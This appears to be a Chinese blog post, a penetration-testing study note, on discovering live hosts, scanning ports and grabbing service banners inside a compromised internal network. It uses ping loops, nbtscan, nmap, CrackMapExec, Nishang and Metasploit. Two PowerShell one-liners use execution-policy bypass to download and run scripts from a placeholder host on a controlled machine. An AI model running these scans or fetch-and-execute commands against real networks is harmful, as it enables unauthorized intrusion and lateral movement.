@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://gcore.jsdelivr.net'>
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>内网资源探测 - v2ish1yan`s blog</title>
+
+  
+    <meta name="description" content="内网渗透体系建设笔记-内网资源探测">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网资源探测">
+<meta property="og:url" content="http://example.com/2023/07/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%952/index.html">
+<meta property="og:site_name" content="v2ish1yan&#96;s blog">
+<meta property="og:description" content="内网渗透体系建设笔记-内网资源探测">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212012027328.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212012021980.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212291954829.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301441995.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301541396.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301547307.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301555943.png">
+<meta property="article:published_time" content="2023-07-03T08:36:07.935Z">
+<meta property="article:modified_time" content="2023-07-03T08:36:07.989Z">
+<meta property="article:author" content="v2ish1yan">
+<meta property="article:tag" content="信息搜集">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212012027328.png">
+  
+  
+  
+  <meta name="keywords" content="信息搜集">
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120002492.png">
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120001591.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">v2ish1yan`s blog</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/links/">友链</a></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc"><div class="widget-header cap dis-select"><span class="name">内网资源探测</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EICMP"><span class="toc-text">基于ICMP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8ENetBIOS-%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5-x2F-%E8%BE%93%E5%87%BA%E7%B3%BB%E7%BB%9F"><span class="toc-text">基于NetBIOS(网络基本输入&#x2F;输出系统)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EUDP"><span class="toc-text">基于UDP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EAPR"><span class="toc-text">基于APR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8ESMB%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B6%88%E6%81%AF%E5%9D%97%EF%BC%89"><span class="toc-text">基于SMB（服务器消息块）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Telnet%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3"><span class="toc-text">利用Telnet探测端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8nmap%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">利用nmap进行端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8PowerShell%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">利用PowerShell进行端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NetCat%E8%8E%B7%E5%8F%96Banner"><span class="toc-text">NetCat获取Banner</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Telnet%E8%8E%B7%E5%8F%96%E7%AB%AF%E5%8F%A3Banner"><span class="toc-text">利用Telnet获取端口Banner</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Nmap%E8%8E%B7%E5%8F%96%E7%AB%AF%E5%8F%A3Banner"><span class="toc-text">使用Nmap获取端口Banner</span></a></li></ol></div></div></widget>
+
+
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div id="post-meta">发布于&nbsp;<time datetime="2023-07-03T08:36:07.935Z">2023-07-03</time></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>内网资源探测</span></h1>
+<h1 id="发现存活主机"><a href="#发现存活主机" class="headerlink" title="发现存活主机"></a>发现存活主机</h1><p>可以使用ICMP,NetBIOS,UDP,ARP,SNMP,SMB等多种协议。</p>
+<h2 id="基于ICMP"><a href="#基于ICMP" class="headerlink" title="基于ICMP"></a>基于ICMP</h2><blockquote>
+<p>ICMP（Internet Control Message Protocol）Internet控制<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%8A%A5%E6%96%87/3164352?fromModule=lemma_inlink">报文</a>协议。它是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE%E7%B0%87?fromModule=lemma_inlink">TCP&#x2F;IP协议簇</a>的一个子协议，用于在IP<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">主机</a>、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1?fromModule=lemma_inlink">路由</a>器之间传递控制消息。控制消息是指<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%80%9A?fromModule=lemma_inlink">网络通</a>不通、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">主机</a>是否可达、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1/363497?fromModule=lemma_inlink">路由</a>是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用</p>
+</blockquote>
+<p>可以通过ICMP循环对整个网段中的每个ip地址执行ping命令，来发现存活的主机</p>
+<p>只有cmd可以，powshell的语法不一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212012027328.png" alt="image-20221201202656380" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221201202656380</span></div></div>
+
+<blockquote>
+<p>&#x2F;L cmd里for循环让变量以递增的方式，1到254，步长为1</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212012021980.png" alt="image-20221201202108896" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221201202108896</span></div></div>
+
+<p>-w timeout 指定超时间隔，单位为毫秒。</p>
+<p>-n count 发送 count 指定的 ECHO 数据包数</p>
+</blockquote>
+<h2 id="基于NetBIOS-网络基本输入-x2F-输出系统"><a href="#基于NetBIOS-网络基本输入-x2F-输出系统" class="headerlink" title="基于NetBIOS(网络基本输入&#x2F;输出系统)"></a>基于NetBIOS(网络基本输入&#x2F;输出系统)</h2><blockquote>
+<p><strong>NetBIOS</strong>，为<strong>网上基本输入输出系统</strong>（英语：Network Basic Input&#x2F;Output System）的缩写，它提供了<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/OSI%E6%A8%A1%E5%9E%8B?fromModule=lemma_inlink">OSI模型</a>中的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BC%9A%E8%AF%9D%E5%B1%82?fromModule=lemma_inlink">会话层</a>服务，让在不同计算机上运行的不同<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F/13831935?fromModule=lemma_inlink">程序</a>，可以在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91?fromModule=lemma_inlink">局域网</a>中，互相连线，以及分享数据。严格来说，NetBIOS不是一种网上协议，而是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3?fromModule=lemma_inlink">应用程序接口</a>（API）。几乎所有的局域网都是在netbios协议的基础上工作的。其工作流程就是将正常的机器名解析、查询、应答的过程。在windows中，默认安装tcp&#x2F;ip后会自动安netbios</p>
+<p>实际利用时，向局域网的每个ip地址发生netbios状态查询，可以获得主机名、mac地址等信息</p>
+</blockquote>
+<p>使用NBTScan来扫描windows网络上netbios名称的程序，用于发现内网中存活的主机</p>
+<p>需要将其上传到目标主机</p>
+<p><a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html">nbtscan</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exec 192.168.39.1/24</span><br></pre></td></tr></table></figure>
+
+<h2 id="基于UDP"><a href="#基于UDP" class="headerlink" title="基于UDP"></a>基于UDP</h2><blockquote>
+<p>[Internet ](<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Internet">https://baike.baidu.com/item/Internet</a> &#x2F;272794?fromModule&#x3D;lemma_inlink)协议集支持一个无连接的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/8048821?fromModule=lemma_inlink">传输协议</a>，该协议称为用户数据报协议（UDP，User Datagram Protocol）。UDP 为<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445?fromModule=lemma_inlink">应用程序</a>提供了一种无需建立连接就可以发送封装的 IP 数据包的方法。</p>
+<p>实际利用中，可以将一个空的udp报文发送到目标主机的特定端口，如果目标主机的端口是关闭的，udp探测就马上得到一个icmp端口无法到达的回应报文，这意味着该主机正在运行。</p>
+<p>如果到达一个开放的端口，大部分服务仅仅忽略这个空报文而不做任何回应</p>
+</blockquote>
+<p>使用Unicornscan,一款kali上的信息收集工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicornscan -mU 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<h2 id="基于APR"><a href="#基于APR" class="headerlink" title="基于APR"></a>基于APR</h2><blockquote>
+<p>地址解析协议，即ARP（Address Resolution Protocol），是根据<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80?fromModule=lemma_inlink">IP地址</a>获取<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/2129?fromModule=lemma_inlink">物理地址</a>的一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE?fromModule=lemma_inlink">TCP&#x2F;IP协议</a>。<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">主机</a>发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p>
+<p>在实际利用中，可以想网络发送一个arp请求，若目标主机处于活跃状态，则一定会回应一个arp响应，否则不会做出任何回应</p>
+</blockquote>
+<ul>
+<li><p>ARP-Scan</p>
+<p>利用arp发现内网中存活的主机，将其上传到目标主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PowerShell</p>
+<p>Empire渗透框架的Invoke-ARPScan.psl脚本。使用时需要将脚本导入执行</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire">Invoke-ARPScan</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-Module .\Invoke-ARPScan.psl</span><br><span class="line">invoke-ARPScan -CIDR 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p>也可以将脚本代码托管在服务器上，通过powershell远程加载运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://you-ip:port/Invoke-ARPScan.psl&#x27;);Invoke-ARPScan -CIDR 10.10.10.0/24&quot;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="基于SMB（服务器消息块）"><a href="#基于SMB（服务器消息块）" class="headerlink" title="基于SMB（服务器消息块）"></a>基于SMB（服务器消息块）</h2><blockquote>
+<p>SMB(全称是Server Message Block)是一个网络<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8D%8F%E8%AE%AE/13020269?fromModule=lemma_inlink">协议</a>名，它能被用于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Web/150564?fromModule=lemma_inlink">Web</a>连接和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF/101081?fromModule=lemma_inlink">客户端</a>与服务器之间的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BF%A1%E6%81%AF%E6%B2%9F%E9%80%9A/1053012?fromModule=lemma_inlink">信息沟通</a>。</p>
+<p>是一种应用层传输协议，主要是使网络上的机器能够共享计算机文件、打印机、串行端口和通信等资源。</p>
+<p>CIFS消息一般使用NetBIOS或TCP发送，分别使用139或者445端口，目前倾向于使用445端口</p>
+<p>实际利用中可以探测局域网中存在的SMB服务来发现存活主机，多适用于windows</p>
+</blockquote>
+<p>CrackMapExec(简称CME)</p>
+<p>在kali上使用，可以枚举登录用户、枚举smb服务列表、执行winrm攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 192.168.30.0/24 </span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212291954829.png" alt="image-20221229195436707" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221229195436707</span></div></div>
+
+<h1 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h1><h2 id="利用Telnet探测端口"><a href="#利用Telnet探测端口" class="headerlink" title="利用Telnet探测端口"></a>利用Telnet探测端口</h2><p>Telnet是进行远程登录的标志协议和主要方式。可以用telnet进行简单测试指定的端口号是打开还是关闭状态</p>
+<p>3389是windows远程桌面服务的默认端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.30.10 3389</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用nmap进行端口扫描"><a href="#利用nmap进行端口扫描" class="headerlink" title="利用nmap进行端口扫描"></a>利用nmap进行端口扫描</h2><p><a target="_blank" rel="noopener" href="https://nmap.org/man/zh/">官方文档</a></p>
+<p>扫描指定端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,88 192.168.30.30</span><br></pre></td></tr></table></figure>
+
+<p>扫描所有开发的端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 1-65535 192.168.30.30</span><br></pre></td></tr></table></figure>
+
+<p>扫描指定端口并获得端口上开放的服务版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p 80,88,135  192.168.30.30</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301441995.png" alt="image-20221230144101927" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221230144101927</span></div></div>
+
+<h2 id="利用PowerShell进行端口扫描"><a href="#利用PowerShell进行端口扫描" class="headerlink" title="利用PowerShell进行端口扫描"></a>利用PowerShell进行端口扫描</h2><p><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">NiShang</a>是基于Powershell的渗透测试专用框架集成了各种脚本和payload</p>
+<p>其中的Scan模块有个<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1">Invoke0PortCan.psl</a>脚本，可以用来对主机进行端口扫描</p>
+<p>要先将这些文件下载下来，并且导入才能使用</p>
+<p>对一个主机范围进行默认的端口扫描</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-PortScan</span> <span class="literal">-StartAddress</span> <span class="number">192.168</span>.<span class="number">30.10</span> <span class="literal">-EndAddress</span> <span class="number">192.168</span>.<span class="number">30.30</span> <span class="literal">-ResolveHost</span> <span class="literal">-ScanPort</span></span><br></pre></td></tr></table></figure>
+
+<p>在拿到一台内网机器控制权时，可以执行以下命令来下载并扫描指定端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -<span class="built_in">exec</span> bypass -Command <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://your-ip:port/Invoke-portscan.ps1&#x27;);Invoke-PortScan -StartAddress 192.168.30.10 -EndAddress 192.168.30.30 -ResolveHost -ScanPort -Port 80,88&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="利用MetaSploit探测内网"><a href="#利用MetaSploit探测内网" class="headerlink" title="利用MetaSploit探测内网"></a>利用MetaSploit探测内网</h1><p><a target="_blank" rel="noopener" href="https://www.metasploit.com/">MetaSploit</a>渗透框架中内置了几款资源搜集模块，可以用于探测内网服务、发现内网存活主机、对目标主机进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">user auxiliary/scanner/netbios/nbanme</span><br><span class="line"><span class="built_in">set</span> RHOST 192.68.30.0/24</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301541396.png" alt="image-20221230154131331" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221230154131331</span></div></div>
+
+<h1 id="获取端口Banner信息"><a href="#获取端口Banner信息" class="headerlink" title="获取端口Banner信息"></a>获取端口Banner信息</h1><p>Banner中可能包含一些敏感信息，通过查看端口的Banner，往往可以获取软件开发商。软件名称、服务类型、版本号等信息，根据不同的服务，可以制订不同的攻击方案，而服务的版本号有时会存在公开的漏洞可以被利用</p>
+<h2 id="NetCat获取Banner"><a href="#NetCat获取Banner" class="headerlink" title="NetCat获取Banner"></a>NetCat获取Banner</h2><p>-nv 选项可以在连接指定的端口时获取该端口的Banner信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv &lt;ip&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301547307.png" alt="image-20221230154728273" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221230154728273</span></div></div>
+
+<h2 id="利用Telnet获取端口Banner"><a href="#利用Telnet获取端口Banner" class="headerlink" title="利用Telnet获取端口Banner"></a>利用Telnet获取端口Banner</h2><p>如果目标端口开放，使用Telnet连接后，也会返回相应的Banner信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;IP&gt; &lt;Port&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用Nmap获取端口Banner"><a href="#使用Nmap获取端口Banner" class="headerlink" title="使用Nmap获取端口Banner"></a>使用Nmap获取端口Banner</h2><p>在namp中指定脚本”–script&#x3D;banner” ,可以在端口扫描过程中获取端口的Banner</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=banner -p 1-200 192.168.30.10 </span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301555943.png" alt="image-20221230155537905" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221230155537905</span></div></div>
+
+
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/07/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%951/">内网信息搜集</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/07/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%953/">用户凭据收集</a></div></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="/">@anonymity</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
